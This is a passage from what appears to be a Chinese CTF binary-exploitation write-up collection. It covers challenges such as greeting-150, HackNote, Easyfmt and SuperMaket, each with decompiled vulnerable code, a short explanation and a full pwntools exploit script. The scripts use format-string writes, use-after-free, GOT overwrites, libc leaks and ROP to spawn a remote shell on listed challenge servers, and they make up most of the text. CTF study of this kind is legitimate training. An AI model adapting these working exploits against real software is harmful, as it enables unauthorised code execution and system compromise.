&#x27;%19$p&#x27;\tsl(p)\tru(&#x27;0x&#x27;)\tlibc_start_main = int(r(12),16) - 240\tlibc_base = libc_start_main - lib.sym[&#x27;__libc_start_main&#x27;]\tli(&#x27;libc_base:&#x27; + hex(libc_base))\tsys_addr = libc_base + lib.sym[&#x27;system&#x27;]\tsh_addr  = libc_base + lib.search(&#x27;/bin/sh&#x27;).next()\t\t# leaking elf base\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tsla(&#x27;:&#x27;, str(7))\tp = &#x27;%14$p&#x27;\tsl(p)\tru(&#x27;0x&#x27;)\telf_base = int(r(12),16) - 0xD30\tmain_addr = elf_base + 0xC6C\tpop_rdi_ret = elf_base + 0xd93\tli(&#x27;elf_base:&#x27; + hex(elf_base))\t#leaking main ret in stack\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tsla(&#x27;:&#x27;, str(7))\tp = &#x27;%12$p&#x27;\tsl(p)\tru(&#x27;0x&#x27;)\tmain_ret = int(r(12),16) + 0x8\t\t#leaking IO_buf_base\t_IO_2_1_stdin_ = libc_base + lib.sym[&#x27;_IO_2_1_stdin_&#x27;]\t_IO_buf_base = _IO_2_1_stdin_ + 0x8 * 7\tli(&#x27;_IO_buf_base&#x27; + hex(_IO_buf_base))\t\t    #modify _IO_buf_base\tsla(&#x27;&gt;&gt;&#x27;, str(1))\tp = p64(_IO_buf_base)\tsl(p)\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tsla(&#x27;:&#x27;, str(7))\tp = &#x27;%16$hhn&#x27;\tsl(p)\t#build payload to modify _IO_2_1_stdin struct\tp = p64(_IO_2_1_stdin_ + 0x83) * 3\tp += p64(main_ret) + p64(main_ret + 0x8 * 3)\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tsa(&#x27;:&#x27;, p) #length:\tsl(&#x27;&#x27;)\t\t#call getchar() make fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_end\tfor i in range(0, len(p) - 1):\t\tsla(&#x27;&gt;&gt;&#x27;, str(2))\t\tsla(&#x27;:&#x27;, &#x27;,&#x27;)\t\tsl(&#x27; &#x27;)\t\t#build rop chail\tsla(&#x27;&gt;&gt;&#x27;, str(2))\tp = p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)\tsla(&#x27;:&#x27;, p) #length:\tsl(&#x27;&#x27;)\t#db()\t#get shell\tsla(&#x27;&gt;&gt;&#x27;, str(3))\tdef finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\t#io = exe.process()\t\tif LIBC:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIBC:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()    \n\n\n\n\n\ngreeting-150保护Arch:     i386-32-littleRELRO:    No RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)\n\n漏洞字符串漏洞\n源代码\nchar s; // [esp+1Ch] [ebp-84h]char v5; // [esp+5Ch] [ebp-44h]unsigned int v6; // [esp+9Ch] [ebp-4h]v6 = __readgsdword(0x14u);printf(&quot;Please tell me your name... &quot;);if ( !getnline(&amp;v5, 0x40) )  return puts(&quot;Don&#x27;t ignore me ;( &quot;);sprintf(&amp;s, &quot;Nice to meet you, %s :)\\n&quot;, &amp;v5);return printf(&amp;s); #字符串漏洞\n\n\n\n利用由于程序中只有一个字符串漏洞, 执行字符串漏洞后结束,这时就需要覆盖fini_array为start函数进行再次执行程序同时修改strlen的got表为system plt地址.\n简单介绍一下: fini_array, 在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针\n字符串漏洞设置大的值注意的地方hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数\n\n\n第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 &#x3D; 16.\n之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为%30c% offset$hhn\n当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）&#x3D;0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 &#x3D;  0xD0（208），也就是填入%208c%offset$hhn即可\n\n单字节覆盖常用脚本(ctf-wiki):\ndef fmt(prev, word, index): # prev: payload 长度,  word: 单个字符, index: 偏移地址 + i    if prev &lt; word: #若payload长度小于单个字符的值时        result = word - prev        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot; #直接写入差值,补齐    elif prev == word: #若payload长度等于单个字符的值时        result = 0 #不写    else:       #若payload长度大于单个字符的值时        result = 256 + word - prev  #通过单个字符溢出来打        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;    fmtstr += &quot;%&quot; + str(index) + &quot;$hhn&quot; #添加自payload    return fmtstrdef fmt_str(offset, size, addr, target):    payload = &quot;&quot;    for i in range(4):        if size == 4:            payload += p32(addr + i) #32位将要覆盖的地址        else:            payload += p64(addr + i) #64位将要覆盖的地址    prev = len(payload) #获取payload长度    for i in range(4):        #传入,payload长度, 目标字节, 偏移        payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)        prev = (target &gt;&gt; i * 8) &amp; 0xff    return payload#fmt_str(12, 4, exe.got[&#x27;strlen&#x27;], exe.plt[&#x27;system&#x27;])&#x27;&#x27;&#x27;其中每个参数的含义基本如下    offset表示要覆盖的地址最初的偏移    size表示机器字长    addr表示将要覆盖的地址。    target表示我们要覆盖为的目的变量值。&#x27;&#x27;&#x27;\n\n\n\n通过上面的介绍, 根据以上脚本写字符串漏洞原理写exp\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile  = &quot;greeting-150&quot;libFile  = &quot;&quot;remoteIp = &quot;111.198.29.45&quot;remotePort = 46553LOCAL = 0LIBC  = 0r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------#--------------------------Exploit--------------------------def exploit():\tru(&#x27;... &#x27;)\tstrlen_got = exe.got[&#x27;strlen&#x27;]\t# ELF Termination Funciton Talbe\t# strlen_got 0x08049a54\tfini_array = 0x08049934\tstart_addr = 0x080484F0\tsystem_plt = 0x08048490\t# &#x27;Nice to meet you, %s:)&#x27; + str\t# offset 12\toffset = 12\tprelen = len(&#x27;Nice to meet you, &#x27;)\tli(&#x27;strlen_got: &#x27; + hex(strlen_got))\tli(&#x27;fini_array: &#x27; + hex(fini_array))\tp = &#x27;AA&#x27; #aliament\tp += p32(strlen_got + 2)\tp += p32(fini_array + 2)\tp += p32(strlen_got)\tp += p32(fini_array)\t#modify highword(strlen_got)\tp += &#x27;%&#x27; + str(0x0804 - 0x12 - prelen) + &#x27;c%&#x27; + str(offset) + &#x27;$hn&#x27;    #modify highword(fini_arry_addr)\tp += &#x27;%&#x27; + str(offset + 1) + &#x27;$hn&#x27;\t#modify lowword(system_plt)\tp += &#x27;%&#x27; + str(0x8490 - 0x804) + &#x27;c%&#x27; + str(offset + 2) + &#x27;$hn&#x27;\t#modify lowword(fini_plt)\tp += &#x27;%&#x27; + str(0x84F0 - 0x8490) + &#x27;c%&#x27; + str(offset + 3) + &#x27;$hn&#x27;\tsl(p)def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIBC:\t\t\tlibc = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIBC:\t\t\tlibc = ELF(libFile)\texploit()\tfinish()\n\n\n\nOne Gadgetone-gadget 是glibc里调用execve(&#39;/bin/sh&#39;, NULL, NULL)的一段非常有用的gadget。在我们能够控制ip（也就是pc）的时候，用one-gadget来做RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用system(&quot;sh&quot;)，这个时候one gadget就可以搞定了\n使用one_gadget工具进行获取oen_gadget\none_gadget工具安装:\ngithub: https://github.com/david942j/one_gadget\nsudo apt install rubysudo apt install gemsudo gem install one_gadget\n\n通过ida查看伪代码\nvoid (*v4)(void); // [rsp+8h] [rbp-18h]void (*v5)(void); // [rsp+10h] [rbp-10h]unsigned __int64 v6; // [rsp+18h] [rbp-8h]v6 = __readfsqword(0x28u);init(*(_QWORD *)&amp;argc, argv, envp);printf(&quot;Give me your one gadget:&quot;);__isoc99_scanf(&quot;%ld&quot;, &amp;v4);v5 = v4;v4();\n\n思路: 通过init打印出printf在libc中的地址, 然后计算libc基地址, 使用one_gadget打shell\nexp如下:\n#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile  = &quot;one_gadget&quot;libFile  = &quot;./libc-2.29.so&quot;remoteIp = &quot;node3.buuoj.cn&quot;remotePort = 26163LOCAL = 0LIBC  = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------#--------------------------Exploit--------------------------def exploit():\tru(&#x27;0x&#x27;)\tprint_addr = int(r(12), 16)\tli(&#x27;print_addr:&#x27; + hex(print_addr))\tlib_base = print_addr - lib.sym[&#x27;printf&#x27;]\tone_gadget =[0xe237f,0xe2383,0xe2386,0x106ef8]\tsh = lib_base + one_gadget[3]\tli(&#x27;lib_base:&#x27; + hex(lib_base))\tli(&#x27;OG addr:&#x27; + hex(sh))\tru(&#x27;:&#x27;)\tp = str(sh)\t#db()\tsl(p)\t#a = 1def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIBC:\t\t\tlib = ELF(libFile)\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\t#io = exe.process()\telse:\t\tio = remote(remoteIp, remotePort)\t\tif LIBC:\t\t\tlib = ELF(libFile)\texploit()\tfinish()&#x27;&#x27;&#x27;\tpwn@Ubuntu:~/share$ one_gadget libc-2.29.so\t0xe237f execve(&quot;/bin/sh&quot;, rcx, [rbp-0x70])\tconstraints:\t[rcx] == NULL || rcx == NULL\t[[rbp-0x70]] == NULL || [rbp-0x70] == NULL\t0xe2383 execve(&quot;/bin/sh&quot;, rcx, rdx)\tconstraints:\t[rcx] == NULL || rcx == NULL\t[rdx] == NULL || rdx == NULL\t0xe2386 execve(&quot;/bin/sh&quot;, rsi, rdx)\tconstraints:    [rsi] == NULL || rsi == NULL\t[rdx] == NULL || rdx == NULL\t0x106ef8 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)\tconstraints:\t[rsp+0x70] == NULL&#x27;&#x27;&#x27;\n\n\n\nHackNote来源World of Attack &amp; Defense\n难度4 &#x2F; 10\n保护 Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)\n\n简单描述相对比较简单的堆利用题目, 保护机制比较少,涉及知识点也比较少…\nvulunsigned int rm()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf; // [esp+8h] [ebp-10h]  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, &amp;buf, 4u);  v1 = atoi(&amp;buf);  if ( v1 &lt; 0 || v1 &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( ptr[v1] )  &#123;    free(*((void **)ptr[v1] + 1));    free(ptr[v1]); //释放后没有让指针数组清空    puts(&quot;Success&quot;);                            // not set null  &#125;  return __readgsdword(0x14u) ^ v3;&#125;... ...    //打印函数unsigned int puts_0()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf; // [esp+8h] [ebp-10h]  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, &amp;buf, 4u);  v1 = atoi(&amp;buf);  if ( v1 &lt; 0 || v1 &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( ptr[v1] )     //vul 可以在堆中修改实现控制eip    (*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]); //若没释放会调用 addputs函数  return __readgsdword(0x14u) ^ v3;&#125;int __cdecl addputs(int a1)&#123;  return puts(*(const char **)(a1 + 4));&#125;\n\n\n\n知识点堆的基本利用\n思路使用UAF漏洞实现和在堆中调用指针函数漏洞来实现获取libc基址,获取system地址,再次使用UAF修改该指针打印调用system获得shell\n利用获取libc基址ad(0x10, &#x27;A&#x27;)ad(0x10, &#x27;B&#x27;)rm(0)rm(1)dump_addr = 0x0804862Bad(0x8, p32(dump_addr) + p32(exe.got[&#x27;puts&#x27;]))dp(0)puts_addr = u32(r(4))li(&#x27;puts_addr: &#x27; + hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)sys_addr = libc_base + libc.dump(&#x27;system&#x27;)\n\ngetshell通过修改函数指针为system获得shell\n# get shellrm(2)ad(0x8, p32(sys_addr) + &#x27;; sh&#x27;)dp(0)\n\n\n\n\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile  = &quot;hacknote&quot;libFile  = &quot;&quot;remoteIp = &quot;111.198.29.45&quot;remotePort = 32693LOCAL = 0LIB   = 0r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size, text):\tsa(&#x27;Your choice :&#x27;, str(1))\tsa(&#x27;Note size :&#x27;, str(size))\tsa(&#x27;Content :&#x27;, text)def rm(index):\tsa(&#x27;Your choice :&#x27;, str(2))\tsa(&#x27;:&#x27;, str(index))def dp(index):\tsa(&#x27;Your choice :&#x27;, str(3))\tsa(&#x27;:&#x27;, str(index))\tdef q():\tsa(&#x27;Your choice :&#x27;, str(4))#--------------------------Exploit--------------------------def exploit():\t#li(rl())\tad(0x10, &#x27;A&#x27;)\tad(0x10, &#x27;B&#x27;)\trm(0)\trm(1)\tdump_addr = 0x0804862B\tad(0x8, p32(dump_addr) + p32(exe.got[&#x27;puts&#x27;]))\tdp(0)\tputs_addr = u32(r(4))\tli(&#x27;puts_addr: &#x27; + hex(puts_addr))\tlibc = LibcSearcher(&#x27;puts&#x27;, puts_addr)\tlibc_base = puts_addr - libc.dump(&#x27;puts&#x27;)\tsys_addr = libc_base + libc.dump(&#x27;system&#x27;)\t# get shell\trm(2)\tad(0x8, p32(sys_addr) + &#x27;; sh&#x27;)\tdp(0)def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n\n\n\nEasyfmt来源攻防世界\nvulint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char buf; // [rsp+10h] [rbp-110h]  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 1, 0LL);  puts(&quot;welcome to haerbin~&quot;);  if ( (unsigned int)CheckIn() == 1 )  &#123;    memset(&amp;buf, 0, 0x100uLL);    write(1, &quot;slogan: &quot;, 9uLL);    read(0, &amp;buf, 0x100uLL);    printf(&amp;buf, &amp;buf, argv); //fmt vul  &#125;  puts(&quot;bye~&quot;);  exit(0);                                      // modify this&#125;\n\n思路这是一个有概率的题,需要多打几次, 概率绕过第一个后, 通过fmt漏洞修改exit的got表实现循环利用,然后泄漏__libc_start_main获取libc基址, 获取system地址后, 然后再partial write修改printf的got为system地址\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile  = &quot;easyfmt&quot;libFile  = &quot;&quot;remoteIp = &quot;111.198.29.45&quot;remotePort = 53453LOCAL = 0LIB   = 0#  ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def fmt(prev, word, index):    if prev &lt; word:        result = word - prev        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;    elif prev == word:        result = 0    else:        result = 256 + word - prev        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;    fmtstr += &quot;%&quot; + str(index) + &quot;$hhn&quot;    return fmtstrdef fmt_str(offset, size, addr, target):    payload = &quot;&quot;    for i in range(4):        if size == 4:            payload += p32(addr + i)        else:            payload += p64(addr + i)    prev = len(payload)    for i in range(4):        payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)        prev = (target &gt;&gt; i * 8) &amp; 0xff    return payload#--------------------------Exploit--------------------------def exploit():\tli(rl())\tp = &#x27;\\x31&#x27; + &#x27;\\x00&#x27; * 9\ts(p)\tru(&#x27;:&#x27;)\toffset = 10\tstart_addr = 0x400750\texit_got   = exe.got[&#x27;exit&#x27;]\texit_plt   = 0x400720\tfmt_addr = 0x400982\t#leaking libc\t\tfini_array = 0x400a74\t#modify exit got as fmt_start\t#can&#x27;t set addr at front\tp = &#x27;%&#x27; + str(fmt_addr &amp; 0xFFFF) + &#x27;c%10$hn&#x27; + &#x27;A&#x27; * 4 + p64(exit_got)\tli(&#x27;exit_got: &#x27; + hex(exit_got))\ts(p)\t#leaking libc\tru(&#x27;:&#x27;)\tp = &#x27;%&#x27; + str(44) +&#x27;$p&#x27;\ts(p)\tru(&#x27;0x&#x27;)\t__libc_start_main = int(r(12), 16) - 240\t#db()\tlibc = LibcSearcher(&#x27;__libc_start_main&#x27;, __libc_start_main)\tlibc_base = __libc_start_main - libc.dump(&#x27;__libc_start_main&#x27;)\tsys_addr = libc_base + libc.dump(&#x27;system&#x27;)\tsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)\tprintf_addr = libc_base + libc.dump(&#x27;printf&#x27;)\t#log\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tli(&#x27;printf_got: &#x27; + hex(exe.got[&#x27;printf&#x27;]))\tli(&#x27;system_addr: &#x27; + hex(sys_addr))\tli(&#x27;printf_addr: &#x27; + hex(printf_addr))\tli(hex(0x550000 &gt;&gt; 8 * 2))\trb3 = (sys_addr &amp; 0xFF0000) &gt;&gt; (8 * 2)\tli(&#x27;sys_5: &#x27; + hex(rb3))\t# modify printf got addr as system\tp = &#x27;%&#x27; + str(rb3) + &#x27;c%13$hhn&#x27;\tp +=  &#x27;%&#x27; + str((sys_addr &amp; 0xFFFF) - rb3) + &#x27;c%14$hn&#x27;\tp += p64(exe.got[&#x27;printf&#x27;] + 2) #0xFF0000\tp += p64(exe.got[&#x27;printf&#x27;] + 0) #0xFFFF\t\t#db()\ts(p)\tsl(&#x27;/bin/sh&#x27;)def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()    \n\n\n\nSuperMaket漏洞点:添加和删除基本上没有十分严密, 找不到漏洞, 输入的长度且必须是n - 1, 不存在 off by one.然而在修改description的时候,当新的大小与以前大小不同时, 就会realloc重新分配内存.但没有跟新list数组中的指针.若重新分配大的话, 就造成use after free.\n简要说一下 realloc函数吧:\nextern void *realloc(void *mem_address, unsigned int newsize);\nrealloc会根据newsize大小来判断怎样分配新的内存, 并却将原来的数据拷贝到新分配的内存中.\nrealloc包含了 malloc, free, memcpy三个函数功能, 若新的大小过大的时候, 且在相邻chunk没有空间可分配, 这时候,系统就会去找一个空间够的地方来开辟内存, 这时候就可能涉及到这三个函数的功能. malloc新的内存, mcmcpy拷贝数据, free掉以前的chunk.\n漏洞代码:for ( size = 0; size &lt;= 0 || size &gt; 256; size = inputNum() )    printf(&quot;descrip_size:&quot;);  if ( *((_DWORD *)(&amp;list_0)[v1] + 5) != size )    realloc(*((void **)(&amp;list_0)[v1] + 6), size); //漏洞点  printf(&quot;description:&quot;);  return inputName(*((_DWORD *)(&amp;list_0)[v1] + 6), *((_DWORD *)(&amp;list_0)[v1] + 5));&#125;\n\n整体思路:获得libc的基地址:利用这个漏洞来修改free函数的got表为puts, 传入参数为atoi函数的got地址.调用free时, 获得atoi在libc中的地址.计算偏移即可\n调用system.获得libc地址之后, 也利用这个漏洞修改atoi的got表地址为system地址.然后在进行选择的时候直接传入参数 ‘&#x2F;bin&#x2F;sh’即可获得shell.当然还可以继续修改free的got地址为system.但需要得到’&#x2F;bin&#x2F;sh’在libc中的地址, 且在chunk头的decription地址中写入该地址.调用free也行, 我试过了, system虽然能调用成功, 就是这个’&#x2F;bin&#x2F;sh’在libc中的偏移有问题. 结果 就是sh :cmd not found\n以上就是整体思路:\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile  = &quot;supermarket&quot;libFile  = &quot;libc.so.6&quot;remoteIp = &quot;111.198.29.45&quot;remotePort = 57966LOCAL = 0LIBC  = 1r   =  lambda x : io.recv(x)rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(index, size, text):\tsla(&#x27;&gt;&gt; &#x27;, str(1))\tsla(&#x27;:&#x27;, str(index))\tsla(&#x27;:&#x27;, str(0))\tsla(&#x27;:&#x27;, str(size))\tsla(&#x27;:&#x27;, text)def rm(index):\tsla(&#x27;&gt;&gt; &#x27;, str(2))\tsla(&#x27;:&#x27;, str(index))def dp():\tsla(&#x27;&gt;&gt; &#x27;, str(3))def md(index, size, text):\tsla(&#x27;&gt;&gt; &#x27;, str(5))\tsla(&#x27;:&#x27;, str(index))\tsla(&#x27;:&#x27;, str(size))\tsla(&#x27;:&#x27;, text)def q():\tsa(&#x27;&gt;&gt; &#x27;, str(6))#--------------------------Exploit--------------------------def exploit():\tad(0, 0x80, &#x27;0&#x27; * (0x80 - 1))\tad(1, 0x10, &#x27;1&#x27; * (0x10 - 1))\tmd(0, 0x90, &#x27;&#x27;) #不要向free掉的数据块中写入数据. 不然后期无法malloc\tad(2, 0x10, &#x27;2&#x27; * (0x10 - 1))\tp = p32(0x32) + p32(0) * 4\tp += p32(0x10) + p32(exe.got[&#x27;free&#x27;])\tp += &#x27;\\x19&#x27;\tmd(0, 0x80, p) # modify dscription addr as free got addr\tp2 = p32(exe.plt[&#x27;puts&#x27;])\tmd(2, 0x10, p2) #modify free got addr as puts got addr\t# leaking\tp3 = p32(0x32) + p32(0) * 4\tp3 += p32(0x10) + p32(exe.got[&#x27;atoi&#x27;])\tp3 += &#x27;\\x19&#x27;\tmd(0, 0x80, p3)\trm(2) #puts atoi addr in libc\tatoi_addr = u32(r(4))\tli(&#x27;libc_base: &#x27; + hex(atoi_addr))\tlibc_base = atoi_addr - lib.sym[&#x27;atoi&#x27;]\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tsys_addr = libc_base + lib.sym[&#x27;system&#x27;]\tsh_addr = libc_base + 0x0015902b\t#modify got addr as system\tad(3, 0x10, &#x27;3&#x27; * (0x10 - 1))\tp4 = p32(0x32) + p32(0) * 4\tp4 += p32(0x10) + p32(0x0)\tp4 += p32(0x19) + p32(0x0) * 5\tp4 += p32(0x21) # modify item 3\tp4 += p32(0x33) #3\tp4 += p32(0x0) * 4\tp4 += p32(0x10)\tp4 += p32(exe.got[&#x27;atoi&#x27;]) + &#x27;\\x19&#x27;\tmd(0, 0x80, p4)\tp5 = p32(sys_addr)\tmd(3, 0x10, p5) # modify atoi got table as system\t#db()\t# call system with /bin/sh\tsla(&#x27;&gt;&gt; &#x27;, &#x27;/bin/sh&#x27;)def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\texe = ELF(exeFile)\tif LOCAL:\t\tif LIBC:\t\t\tlib = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)\t\t#io = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\tio = exe.process()\telse:\t\tio = remote(remoteIp, remotePort)\t\tif LIBC:\t\t\tlib = ELF(libFile)\texploit()\tfinish()\n\n\n\nBabyheap来源World of Attack &amp; Defense\n难度6 &#x2F; 10\n保护 Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX 